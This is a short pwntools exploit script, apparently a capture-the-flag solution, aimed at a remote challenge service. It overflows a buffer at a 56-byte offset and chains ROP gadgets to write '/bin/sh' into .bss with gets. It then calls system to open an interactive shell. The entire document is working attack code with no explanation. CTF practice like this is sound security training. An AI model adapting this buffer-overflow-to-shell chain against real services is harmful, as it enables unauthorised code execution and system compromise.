#!/usr/bin/python3

from pwn import *

#p = process("./pwn")
p = remote("chall.csivit.com", 30007)
elf = ELF("./pwn")
offset = 56
rop = ROP("./pwn")

PopRdi = rop.find_gadget(['pop rdi', 'ret'])[0]
bss = 0x4040a0

#First main
log.info("Pop rdi; ret @ 0x%x" , PopRdi)
payload = b"M"*56 + p64(PopRdi) +p64(bss) +p64(elf.plt["gets"]) + p64(elf.sym["main"])
print(p.recvline())
p.sendline(payload)
p.sendline("/bin/sh\0")
print("Done writing /bin/sh !")

#Second main
print(p.recvline())
payload2 = b"M"*offset + p64(PopRdi) + p64(bss) + p64(elf.plt["system"])
p.sendline(payload2)
p.interactive()


